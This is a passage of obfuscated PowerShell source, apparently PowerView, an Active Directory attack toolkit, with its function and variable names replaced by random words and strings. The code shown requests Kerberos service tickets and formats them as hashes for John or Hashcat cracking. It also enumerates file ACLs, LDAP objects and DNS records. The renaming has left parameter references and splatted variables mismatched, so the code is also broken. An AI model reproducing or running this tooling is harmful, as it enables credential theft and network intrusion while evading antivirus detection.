    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $MhNmgElNMTxhWpJ,

        [ValidateNotNullOrEmpty()]
        [String]
        $pkMxgDCVHqOym9m,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $RmrzVOkRggEzAyC,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $KZiNDyuCPTYnSy9,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vzBgfX9wPWmbsYZ,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $HWlMnJozs9zEkRJ = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $hHyMPLAr9azKKcQ = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $kzlBjIuOb9n9uyj,

        [Switch]
        $gPSKVqwcbkEyaoZ,

        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $TwWb9jav9DsNots = 'Hashcat',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $X9xElWbFpfFW9IW = @{
            'SPN' = $True
            'Properties' = 'samaccountname,distinguishedname,serviceprincipalname'
        }
        if ($PSBoundParameters['Domain']) { $X9xElWbFpfFW9IW['Domain'] = $pkMxgDCVHqOym9m }
        if ($PSBoundParameters['LDAPFilter']) { $X9xElWbFpfFW9IW['LDAPFilter'] = $RmrzVOkRggEzAyC }
        if ($PSBoundParameters['SearchBase']) { $X9xElWbFpfFW9IW['SearchBase'] = $KZiNDyuCPTYnSy9 }
        if ($PSBoundParameters['Server']) { $X9xElWbFpfFW9IW['Server'] = $vzBgfX9wPWmbsYZ }
        if ($PSBoundParameters['SearchScope']) { $X9xElWbFpfFW9IW['SearchScope'] = $HWlMnJozs9zEkRJ }
        if ($PSBoundParameters['ResultPageSize']) { $X9xElWbFpfFW9IW['ResultPageSize'] = $hHyMPLAr9azKKcQ }
        if ($PSBoundParameters['ServerTimeLimit']) { $X9xElWbFpfFW9IW['ServerTimeLimit'] = $kzlBjIuOb9n9uyj }
        if ($PSBoundParameters['Tombstone']) { $X9xElWbFpfFW9IW['Tombstone'] = $gPSKVqwcbkEyaoZ }
        if ($PSBoundParameters['Credential']) { $X9xElWbFpfFW9IW['Credential'] = $szvFVWkPJummdcf }

        if ($PSBoundParameters['Credential']) {
            $wFitNRlTdxnBQoR = descendents -szvFVWkPJummdcf $szvFVWkPJummdcf
        }
    }

    PROCESS {
        if ($PSBoundParameters['Identity']) { $X9xElWbFpfFW9IW['Identity'] = $MhNmgElNMTxhWpJ }
        noshes @UserSearcherArguments | Where-Object {$_.samaccountname -ne 'krbtgt'} | embryologist -TwWb9jav9DsNots $TwWb9jav9DsNots
    }

    END {
        if ($wFitNRlTdxnBQoR) {
            volubility -waC9KrLWsegTDKV $wFitNRlTdxnBQoR
        }
    }
}


function peripherals {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FileACL')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('FullName')]
        [String[]]
        $Path,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {

        function polymerization {

            [CmdletBinding()]
            Param(
                [Int]
                $FSR
            )

            $AccessMask = @{
                [uint32]'0x80000000' = 'GenericRead'
                [uint32]'0x40000000' = 'GenericWrite'
                [uint32]'0x20000000' = 'GenericExecute'
                [uint32]'0x10000000' = 'GenericAll'
                [uint32]'0x02000000' = 'MaximumAllowed'
                [uint32]'0x01000000' = 'AccessSystemSecurity'
                [uint32]'0x00100000' = 'Synchronize'
                [uint32]'0x00080000' = 'WriteOwner'
                [uint32]'0x00040000' = 'WriteDAC'
                [uint32]'0x00020000' = 'ReadControl'
                [uint32]'0x00010000' = 'Delete'
                [uint32]'0x00000100' = 'WriteAttributes'
                [uint32]'0x00000080' = 'ReadAttributes'
                [uint32]'0x00000040' = 'DeleteChild'
                [uint32]'0x00000020' = 'Execute/Traverse'
                [uint32]'0x00000010' = 'WriteExtendedAttributes'
                [uint32]'0x00000008' = 'ReadExtendedAttributes'
                [uint32]'0x00000004' = 'AppendData/AddSubdirectory'
                [uint32]'0x00000002' = 'WriteData/AddFile'
                [uint32]'0x00000001' = 'ReadData/ListDirectory'
            }

            $jTTCYpgsUBJhsBc = @{
                [uint32]'0x1f01ff' = 'FullControl'
                [uint32]'0x0301bf' = 'Modify'
                [uint32]'0x0200a9' = 'ReadAndExecute'
                [uint32]'0x02019f' = 'ReadAndWrite'
                [uint32]'0x020089' = 'Read'
                [uint32]'0x000116' = 'Write'
            }

            $kfrIiasgay9qWdQ = @()


            $kfrIiasgay9qWdQ += $jTTCYpgsUBJhsBc.Keys | ForEach-Object {
                              if (($FSR -band $_) -eq $_) {
                                $jTTCYpgsUBJhsBc[$_]
                                $FSR = $FSR -band (-not $_)
                              }
                            }


            $kfrIiasgay9qWdQ += $AccessMask.Keys | Where-Object { $FSR -band $_ } | ForEach-Object { $AccessMask[$_] }
            ($kfrIiasgay9qWdQ | Where-Object {$_}) -join ','
        }

        $An9cEA9BZazncEs = @{}
        if ($PSBoundParameters['Credential']) { $An9cEA9BZazncEs['Credential'] = $szvFVWkPJummdcf }

        $vDX9LvEqAPudecx = @{}
    }

    PROCESS {
        ForEach ($uszMwnNhSpfzkA9 in $Path) {
            try {
                if (($uszMwnNhSpfzkA9 -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                    $GHjj9aAkkQaKul9 = (New-Object System.Uri($uszMwnNhSpfzkA9)).Host
                    if (-not $vDX9LvEqAPudecx[$GHjj9aAkkQaKul9]) {

                        misquote -cNTDaoDBIWkDu9I $GHjj9aAkkQaKul9 -szvFVWkPJummdcf $szvFVWkPJummdcf
                        $vDX9LvEqAPudecx[$GHjj9aAkkQaKul9] = $True
                    }
                }

                $ACL = Get-Acl -Path $uszMwnNhSpfzkA9

                $ACL.GetAccessRules($True, $True, [System.Security.Principal.SecurityIdentifier]) | ForEach-Object {
                    $SID = $_.IdentityReference.Value
                    $Name = congesting -ObjectSID $SID @ConvertArguments

                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'Path' $uszMwnNhSpfzkA9
                    $Out | Add-Member Noteproperty 'FileSystemRights' (polymerization -FSR $_.FileSystemRights.value__)
                    $Out | Add-Member Noteproperty 'IdentityReference' $Name
                    $Out | Add-Member Noteproperty 'IdentitySID' $SID
                    $Out | Add-Member Noteproperty 'AccessControlType' $_.AccessControlType
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.FileACL')
                    $Out
                }
            }
            catch {
                Write-Verbose "[peripherals] error: $_"
            }
        }
    }

    END {

        $vDX9LvEqAPudecx.Keys | densities
    }
}


function hoaxer {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        $wDpWXLYTGZrAWN9
    )

    $qjEBlkTFANTUxV9 = @{}

    $wDpWXLYTGZrAWN9.PropertyNames | ForEach-Object {
        if ($_ -ne 'adspath') {
            if (($_ -eq 'objectsid') -or ($_ -eq 'sidhistory')) {

                $qjEBlkTFANTUxV9[$_] = $wDpWXLYTGZrAWN9[$_] | ForEach-Object { (New-Object System.Security.Principal.SecurityIdentifier($_, 0)).Value }
            }
            elseif ($_ -eq 'grouptype') {
                $qjEBlkTFANTUxV9[$_] = $wDpWXLYTGZrAWN9[$_][0] -as $txoxI9aTrtIfDHu
            }
            elseif ($_ -eq 'samaccounttype') {
                $qjEBlkTFANTUxV9[$_] = $wDpWXLYTGZrAWN9[$_][0] -as $ioynBQMoodRObnd
            }
            elseif ($_ -eq 'objectguid') {

                $qjEBlkTFANTUxV9[$_] = (New-Object Guid (,$wDpWXLYTGZrAWN9[$_][0])).Guid
            }
            elseif ($_ -eq 'useraccountcontrol') {
                $qjEBlkTFANTUxV9[$_] = $wDpWXLYTGZrAWN9[$_][0] -as $9HeFXhwjBUWerxx
            }
            elseif ($_ -eq 'ntsecuritydescriptor') {

                $FCnNxZQViinhhmG = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $wDpWXLYTGZrAWN9[$_][0], 0
                if ($FCnNxZQViinhhmG.Owner) {
                    $qjEBlkTFANTUxV9['Owner'] = $FCnNxZQViinhhmG.Owner
                }
                if ($FCnNxZQViinhhmG.Group) {
                    $qjEBlkTFANTUxV9['Group'] = $FCnNxZQViinhhmG.Group
                }
                if ($FCnNxZQViinhhmG.DiscretionaryAcl) {
                    $qjEBlkTFANTUxV9['DiscretionaryAcl'] = $FCnNxZQViinhhmG.DiscretionaryAcl
                }
                if ($FCnNxZQViinhhmG.SystemAcl) {
                    $qjEBlkTFANTUxV9['SystemAcl'] = $FCnNxZQViinhhmG.SystemAcl
                }
            }
            elseif ($_ -eq 'accountexpires') {
                if ($wDpWXLYTGZrAWN9[$_][0] -gt [DateTime]::MaxValue.Ticks) {
                    $qjEBlkTFANTUxV9[$_] = "NEVER"
                }
                else {
                    $qjEBlkTFANTUxV9[$_] = [datetime]::fromfiletime($wDpWXLYTGZrAWN9[$_][0])
                }
            }
            elseif ( ($_ -eq 'lastlogon') -or ($_ -eq 'lastlogontimestamp') -or ($_ -eq 'pwdlastset') -or ($_ -eq 'lastlogoff') -or ($_ -eq 'badPasswordTime') ) {

                if ($wDpWXLYTGZrAWN9[$_][0] -is [System.MarshalByRefObject]) {

                    $Temp = $wDpWXLYTGZrAWN9[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $qjEBlkTFANTUxV9[$_] = ([datetime]::FromFileTime([Int64]("0x{0:x8}{1:x8}" -f $High, $Low)))
                }
                else {

                    $qjEBlkTFANTUxV9[$_] = ([datetime]::FromFileTime(($wDpWXLYTGZrAWN9[$_][0])))
                }
            }
            elseif ($wDpWXLYTGZrAWN9[$_][0] -is [System.MarshalByRefObject]) {

                $Prop = $wDpWXLYTGZrAWN9[$_]
                try {
                    $Temp = $Prop[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $qjEBlkTFANTUxV9[$_] = [Int64]("0x{0:x8}{1:x8}" -f $High, $Low)
                }
                catch {
                    Write-Verbose "[hoaxer] error: $_"
                    $qjEBlkTFANTUxV9[$_] = $Prop[$_]
                }
            }
            elseif ($wDpWXLYTGZrAWN9[$_].count -eq 1) {
                $qjEBlkTFANTUxV9[$_] = $wDpWXLYTGZrAWN9[$_][0]
            }
            else {
                $qjEBlkTFANTUxV9[$_] = $wDpWXLYTGZrAWN9[$_]
            }
        }
    }
    try {
        New-Object -TypeName PSObject -Property $qjEBlkTFANTUxV9
    }
    catch {
        Write-Warning "[hoaxer] Error parsing LDAP properties : $_"
    }
}








function cackles {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.DirectorySearcher')]
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $pkMxgDCVHqOym9m,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $RmrzVOkRggEzAyC,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $wDpWXLYTGZrAWN9,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $KZiNDyuCPTYnSy9,

        [ValidateNotNullOrEmpty()]
        [String]
        $HkqsYMwcdnev9sC,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vzBgfX9wPWmbsYZ,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $HWlMnJozs9zEkRJ = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $hHyMPLAr9azKKcQ = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $kzlBjIuOb9n9uyj = 120,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $TTVRDqV9wSVspX9,

        [Switch]
        $gPSKVqwcbkEyaoZ,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $rT9EZJuWEfY9rVY = $pkMxgDCVHqOym9m

            if ($ENV:USERDNSDOMAIN -and ($ENV:USERDNSDOMAIN.Trim() -ne '')) {

                $tXyHSLSY9cxTtcf = $ENV:USERDNSDOMAIN
                if ($ENV:LOGONSERVER -and ($ENV:LOGONSERVER.Trim() -ne '') -and $tXyHSLSY9cxTtcf) {
                    $XzSWB9zIGPUtrBp = "$($ENV:LOGONSERVER -replace '\\','').$tXyHSLSY9cxTtcf"
                }
            }
        }
        elseif ($PSBoundParameters['Credential']) {

            $xLGosrdXzG9URdW = forked -szvFVWkPJummdcf $szvFVWkPJummdcf
            $XzSWB9zIGPUtrBp = ($xLGosrdXzG9URdW.PdcRoleOwner).Name
            $rT9EZJuWEfY9rVY = $xLGosrdXzG9URdW.Name
        }
        elseif ($ENV:USERDNSDOMAIN -and ($ENV:USERDNSDOMAIN.Trim() -ne '')) {

            $rT9EZJuWEfY9rVY = $ENV:USERDNSDOMAIN
            if ($ENV:LOGONSERVER -and ($ENV:LOGONSERVER.Trim() -ne '') -and $rT9EZJuWEfY9rVY) {
                $XzSWB9zIGPUtrBp = "$($ENV:LOGONSERVER -replace '\\','').$rT9EZJuWEfY9rVY"
            }
        }
        else {

            write-verbose "get-domain"
            $xLGosrdXzG9URdW = forked
            $XzSWB9zIGPUtrBp = ($xLGosrdXzG9URdW.PdcRoleOwner).Name
            $rT9EZJuWEfY9rVY = $xLGosrdXzG9URdW.Name
        }

        if ($PSBoundParameters['Server']) {

            $XzSWB9zIGPUtrBp = $vzBgfX9wPWmbsYZ
        }

        $GuyqeTRAvlVwCsf = 'LDAP://'

        if ($XzSWB9zIGPUtrBp -and ($XzSWB9zIGPUtrBp.Trim() -ne '')) {
            $GuyqeTRAvlVwCsf += $XzSWB9zIGPUtrBp
            if ($rT9EZJuWEfY9rVY) {
                $GuyqeTRAvlVwCsf += '/'
            }
        }

        if ($PSBoundParameters['SearchBasePrefix']) {
            $GuyqeTRAvlVwCsf += $HkqsYMwcdnev9sC + ','
        }

        if ($PSBoundParameters['SearchBase']) {
            if ($KZiNDyuCPTYnSy9 -Match '^GC://') {

                $DN = $KZiNDyuCPTYnSy9.ToUpper().Trim('/')
                $GuyqeTRAvlVwCsf = ''
            }
            else {
                if ($KZiNDyuCPTYnSy9 -match '^LDAP://') {
                    if ($KZiNDyuCPTYnSy9 -match "LDAP://.+/.+") {
                        $GuyqeTRAvlVwCsf = ''
                        $DN = $KZiNDyuCPTYnSy9
                    }
                    else {
                        $DN = $KZiNDyuCPTYnSy9.SubString(7)
                    }
                }
                else {
                    $DN = $KZiNDyuCPTYnSy9
                }
            }
        }
        else {

            if ($rT9EZJuWEfY9rVY -and ($rT9EZJuWEfY9rVY.Trim() -ne '')) {
                $DN = "DC=$($rT9EZJuWEfY9rVY.Replace('.', ',DC='))"
            }
        }

        $GuyqeTRAvlVwCsf += $DN
        Write-Verbose "[cackles] search base: $GuyqeTRAvlVwCsf"

        if ($szvFVWkPJummdcf -ne [Management.Automation.PSCredential]::Empty) {
            Write-Verbose "[cackles] Using alternate credentials for LDAP connection"

            $xLGosrdXzG9URdW = New-Object DirectoryServices.DirectoryEntry($GuyqeTRAvlVwCsf, $szvFVWkPJummdcf.UserName, $szvFVWkPJummdcf.GetNetworkCredential().Password)
            $NenCdilaMvVXuzG = New-Object System.DirectoryServices.DirectorySearcher($xLGosrdXzG9URdW)
        }
        else {

            $NenCdilaMvVXuzG = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$GuyqeTRAvlVwCsf)
        }

        $NenCdilaMvVXuzG.PageSize = $hHyMPLAr9azKKcQ
        $NenCdilaMvVXuzG.SearchScope = $HWlMnJozs9zEkRJ
        $NenCdilaMvVXuzG.CacheResults = $False
        $NenCdilaMvVXuzG.ReferralChasing = [System.DirectoryServices.ReferralChasingOption]::All

        if ($PSBoundParameters['ServerTimeLimit']) {
            $NenCdilaMvVXuzG.ServerTimeLimit = $kzlBjIuOb9n9uyj
        }

        if ($PSBoundParameters['Tombstone']) {
            $NenCdilaMvVXuzG.Tombstone = $True
        }

        if ($PSBoundParameters['LDAPFilter']) {
            $NenCdilaMvVXuzG.filter = $RmrzVOkRggEzAyC
        }

        if ($PSBoundParameters['SecurityMasks']) {
            $NenCdilaMvVXuzG.SecurityMasks = Switch ($TTVRDqV9wSVspX9) {
                'Dacl' { [System.DirectoryServices.SecurityMasks]::Dacl }
                'Group' { [System.DirectoryServices.SecurityMasks]::Group }
                'None' { [System.DirectoryServices.SecurityMasks]::None }
                'Owner' { [System.DirectoryServices.SecurityMasks]::Owner }
                'Sacl' { [System.DirectoryServices.SecurityMasks]::Sacl }
            }
        }

        if ($PSBoundParameters['Properties']) {

            $Bg99dNJhCCtVJZv = $wDpWXLYTGZrAWN9| ForEach-Object { $_.Split(',') }
            $Null = $NenCdilaMvVXuzG.PropertiesToLoad.AddRange(($Bg99dNJhCCtVJZv))
        }

        $NenCdilaMvVXuzG
    }
}


function snared {


    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [Byte[]]
        $XxwULpWpgkOc9Yb
    )

    BEGIN {
        function waistbands {
            [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseOutputTypeCorrectly', '')]
            [CmdletBinding()]
            Param(
                [Byte[]]
                $Raw
            )

            [Int]$hNCnLoLhlQYifT9 = $Raw[0]
            [Int]$ndjOwX9TLUZBU9x = $Raw[1]
            [Int]$Index =  2
            [String]$Name  = ''

            while ($ndjOwX9TLUZBU9x-- -gt 0)
            {
                [Int]$QYI9iAexkyiAK9v = $Raw[$Index++]
                while ($QYI9iAexkyiAK9v-- -gt 0) {
                    $Name += [Char]$Raw[$Index++]
                }
                $Name += "."
            }
            $Name
        }
    }

    PROCESS {

        $wSZoLtHLwnyaccm = [BitConverter]::ToUInt16($XxwULpWpgkOc9Yb, 2)
        $LWfE9gagiGpQpwp = [BitConverter]::ToUInt32($XxwULpWpgkOc9Yb, 8)

        $KWGUdHQWc9hLHKP = $XxwULpWpgkOc9Yb[12..15]


        $Null = [array]::Reverse($KWGUdHQWc9hLHKP)
        $TTL = [BitConverter]::ToUInt32($KWGUdHQWc9hLHKP, 0)

        $Age = [BitConverter]::ToUInt32($XxwULpWpgkOc9Yb, 20)
        if ($Age -ne 0) {
            $j9JXUNuWivSBnFW = ((Get-Date -Year 1601 -Month 1 -Day 1 -Hour 0 -Minute 0 -Second 0).AddHours($age)).ToString()
        }
        else {
            $j9JXUNuWivSBnFW = '[static]'
        }

        $99wQepyWUpdfaeY = New-Object PSObject

        if ($wSZoLtHLwnyaccm -eq 1) {
            $IP = "{0}.{1}.{2}.{3}" -f $XxwULpWpgkOc9Yb[24], $XxwULpWpgkOc9Yb[25], $XxwULpWpgkOc9Yb[26], $XxwULpWpgkOc9Yb[27]
            $Data = $IP
            $99wQepyWUpdfaeY | Add-Member Noteproperty 'RecordType' 'A'
        }

        elseif ($wSZoLtHLwnyaccm -eq 2) {
            $Nrwyj9qSrlmohXY = waistbands $XxwULpWpgkOc9Yb[24..$XxwULpWpgkOc9Yb.length]
            $Data = $Nrwyj9qSrlmohXY
            $99wQepyWUpdfaeY | Add-Member Noteproperty 'RecordType' 'NS'
        }

        elseif ($wSZoLtHLwnyaccm -eq 5) {
            $Alias = waistbands $XxwULpWpgkOc9Yb[24..$XxwULpWpgkOc9Yb.length]
            $Data = $Alias
            $99wQepyWUpdfaeY | Add-Member Noteproperty 'RecordType' 'CNAME'
        }

        elseif ($wSZoLtHLwnyaccm -eq 6) {

            $Data = $([System.Convert]::ToBase64String($XxwULpWpgkOc9Yb[24..$XxwULpWpgkOc9Yb.length]))
            $99wQepyWUpdfaeY | Add-Member Noteproperty 'RecordType' 'SOA'
        }

        elseif ($wSZoLtHLwnyaccm -eq 12) {
            $Ptr = waistbands $XxwULpWpgkOc9Yb[24..$XxwULpWpgkOc9Yb.length]
            $Data = $Ptr
            $99wQepyWUpdfaeY | Add-Member Noteproperty 'RecordType' 'PTR'
        }

        elseif ($wSZoLtHLwnyaccm -eq 13) {

            $Data = $([System.Convert]::ToBase64String($XxwULpWpgkOc9Yb[24..$XxwULpWpgkOc9Yb.length]))
            $99wQepyWUpdfaeY | Add-Member Noteproperty 'RecordType' 'HINFO'
        }

        elseif ($wSZoLtHLwnyaccm -eq 15) {

            $Data = $([System.Convert]::ToBase64String($XxwULpWpgkOc9Yb[24..$XxwULpWpgkOc9Yb.length]))
            $99wQepyWUpdfaeY | Add-Member Noteproperty 'RecordType' 'MX'
        }

        elseif ($wSZoLtHLwnyaccm -eq 16) {
            [string]$TXT  = ''
            [int]$QYI9iAexkyiAK9v = $XxwULpWpgkOc9Yb[24]
            $Index = 25

            while ($QYI9iAexkyiAK9v-- -gt 0) {
                $TXT += [char]$XxwULpWpgkOc9Yb[$index++]
            }

            $Data = $TXT
            $99wQepyWUpdfaeY | Add-Member Noteproperty 'RecordType' 'TXT'
        }

        elseif ($wSZoLtHLwnyaccm -eq 28) {

            $Data = $([System.Convert]::ToBase64String($XxwULpWpgkOc9Yb[24..$XxwULpWpgkOc9Yb.length]))
            $99wQepyWUpdfaeY | Add-Member Noteproperty 'RecordType' 'AAAA'
        }

        elseif ($wSZoLtHLwnyaccm -eq 33) {

            $Data = $([System.Convert]::ToBase64String($XxwULpWpgkOc9Yb[24..$XxwULpWpgkOc9Yb.length]))
            $99wQepyWUpdfaeY | Add-Member Noteproperty 'RecordType' 'SRV'
        }

        else {
            $Data = $([System.Convert]::ToBase64String($XxwULpWpgkOc9Yb[24..$XxwULpWpgkOc9Yb.length]))
            $99wQepyWUpdfaeY | Add-Member Noteproperty 'RecordType' 'UNKNOWN'
        }

        $99wQepyWUpdfaeY | Add-Member Noteproperty 'UpdatedAtSerial' $LWfE9gagiGpQpwp
        $99wQepyWUpdfaeY | Add-Member Noteproperty 'TTL' $TTL
        $99wQepyWUpdfaeY | Add-Member Noteproperty 'Age' $Age
        $99wQepyWUpdfaeY | Add-Member Noteproperty 'TimeStamp' $j9JXUNuWivSBnFW
        $99wQepyWUpdfaeY | Add-Member Noteproperty 'Data' $Data
        $99wQepyWUpdfaeY
    }
}


function mettlesome {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DNSZone')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $pkMxgDCVHqOym9m,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vzBgfX9wPWmbsYZ,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $wDpWXLYTGZrAWN9,

        [ValidateRange(1, 10000)]
        [Int]
        $hHyMPLAr9azKKcQ = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $kzlBjIuOb9n9uyj,

        [Alias('ReturnOne')]
        [Switch]
        $Fdx99xLobbqBPcQ,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $tHAcROQOWB9HdRG = @{
            'LDAPFilter' = '(objectClass=dnsZone)'
        }
        if ($PSBoundParameters['Domain']) { $tHAcROQOWB9HdRG['Domain'] = $pkMxgDCVHqOym9m }
        if ($PSBoundParameters['Server']) { $tHAcROQOWB9HdRG['Server'] = $vzBgfX9wPWmbsYZ }
        if ($PSBoundParameters['Properties']) { $tHAcROQOWB9HdRG['Properties'] = $wDpWXLYTGZrAWN9 }
        if ($PSBoundParameters['ResultPageSize']) { $tHAcROQOWB9HdRG['ResultPageSize'] = $hHyMPLAr9azKKcQ }
        if ($PSBoundParameters['ServerTimeLimit']) { $tHAcROQOWB9HdRG['ServerTimeLimit'] = $kzlBjIuOb9n9uyj }
        if ($PSBoundParameters['Credential']) { $tHAcROQOWB9HdRG['Credential'] = $szvFVWkPJummdcf }
        $QvyMEdrSkoRmWWi = cackles @SearcherArguments

        if ($QvyMEdrSkoRmWWi) {
            if ($PSBoundParameters['FindOne']) { $xSLNEIXByfNTAdG = $QvyMEdrSkoRmWWi.FindOne()  }
            else { $xSLNEIXByfNTAdG = $QvyMEdrSkoRmWWi.FindAll() }
            $xSLNEIXByfNTAdG | Where-Object {$_} | ForEach-Object {
                $Out = hoaxer -wDpWXLYTGZrAWN9 $_.Properties
                $Out | Add-Member NoteProperty 'ZoneName' $Out.name
                $Out.PSObject.TypeNames.Insert(0, 'PowerView.DNSZone')
                $Out
            }

            if ($xSLNEIXByfNTAdG) {
                try { $xSLNEIXByfNTAdG.dispose() }
                catch {
                    Write-Verbose "[footsteps] Error disposing of the Results object: $_"
                }
            }
            $QvyMEdrSkoRmWWi.dispose()
        }

        $tHAcROQOWB9HdRG['SearchBasePrefix'] = 'CN=MicrosoftDNS,DC=DomainDnsZones'
        $WolJiXrZzDbVK9O = cackles @SearcherArguments

        if ($WolJiXrZzDbVK9O) {
            try {
                if ($PSBoundParameters['FindOne']) { $xSLNEIXByfNTAdG = $WolJiXrZzDbVK9O.FindOne() }
                else { $xSLNEIXByfNTAdG = $WolJiXrZzDbVK9O.FindAll() }
                $xSLNEIXByfNTAdG | Where-Object {$_} | ForEach-Object {
                    $Out = hoaxer -wDpWXLYTGZrAWN9 $_.Properties
                    $Out | Add-Member NoteProperty 'ZoneName' $Out.name
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.DNSZone')
                    $Out
                }
                if ($xSLNEIXByfNTAdG) {
                    try { $xSLNEIXByfNTAdG.dispose() }
                    catch {
                        Write-Verbose "[mettlesome] Error disposing of the Results object: $_"
                    }
                }
            }
            catch {
                Write-Verbose "[mettlesome] Error accessing 'CN=MicrosoftDNS,DC=DomainDnsZones'"
            }
            $WolJiXrZzDbVK9O.dispose()
        }
    }
}


function irredeemable {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DNSRecord')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0,  Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Tuvy9HEgBXzRgud,

        [ValidateNotNullOrEmpty()]
        [String]
        $pkMxgDCVHqOym9m,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vzBgfX9wPWmbsYZ,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $wDpWXLYTGZrAWN9 = 'name,distinguishedname,dnsrecord,whencreated,whenchanged',

        [ValidateRange(1, 10000)]
        [Int]
        $hHyMPLAr9azKKcQ = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $kzlBjIuOb9n9uyj,

        [Alias('ReturnOne')]
        [Switch]
        $Fdx99xLobbqBPcQ,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $tHAcROQOWB9HdRG = @{
            'LDAPFilter' = '(objectClass=dnsNode)'
            'SearchBasePrefix' = "DC=$($Tuvy9HEgBXzRgud),CN=MicrosoftDNS,DC=DomainDnsZones"
        }
        if ($PSBoundParameters['Domain']) { $tHAcROQOWB9HdRG['Domain'] = $pkMxgDCVHqOym9m }
        if ($PSBoundParameters['Server']) { $tHAcROQOWB9HdRG['Server'] = $vzBgfX9wPWmbsYZ }
        if ($PSBoundParameters['Properties']) { $tHAcROQOWB9HdRG['Properties'] = $wDpWXLYTGZrAWN9 }
        if ($PSBoundParameters['ResultPageSize']) { $tHAcROQOWB9HdRG['ResultPageSize'] = $hHyMPLAr9azKKcQ }
        if ($PSBoundParameters['ServerTimeLimit']) { $tHAcROQOWB9HdRG['ServerTimeLimit'] = $kzlBjIuOb9n9uyj }
        if ($PSBoundParameters['Credential']) { $tHAcROQOWB9HdRG['Credential'] = $szvFVWkPJummdcf }
        $FIJZustdS9F9aCL = cackles @SearcherArguments

        if ($FIJZustdS9F9aCL) {
            if ($PSBoundParameters['FindOne']) { $xSLNEIXByfNTAdG = $FIJZustdS9F9aCL.FindOne() }
            else { $xSLNEIXByfNTAdG = $FIJZustdS9F9aCL.FindAll() }
            $xSLNEIXByfNTAdG | Where-Object {$_} | ForEach-Object {
                try {
